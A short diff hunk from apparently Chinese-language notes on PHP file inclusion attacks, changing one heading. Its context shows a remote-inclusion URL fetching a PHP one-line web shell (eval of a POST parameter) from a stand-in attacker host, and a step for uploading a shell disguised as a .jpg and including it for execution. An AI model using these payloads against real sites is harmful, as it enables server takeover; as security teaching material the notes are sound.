@@ -43,7 +43,7 @@ allow_url_fopen=on 情况下
 http://www.example.com/index.php?page=http://www.attacker.com/echo.txt
 其中echo.txt内容为:<?php eval($_POST[xxser]);?>
 ```
-3. 本地包含配合文件上传
+3. 本地包含配合文件上传漏洞包含shell
 ```url
 上传一句话木马文件后，通过文件包含利用，非php扩展文件被包含后也会被当作php解析
 http://www.example.com/index.php?page=./uploadfile/xxx.jpg
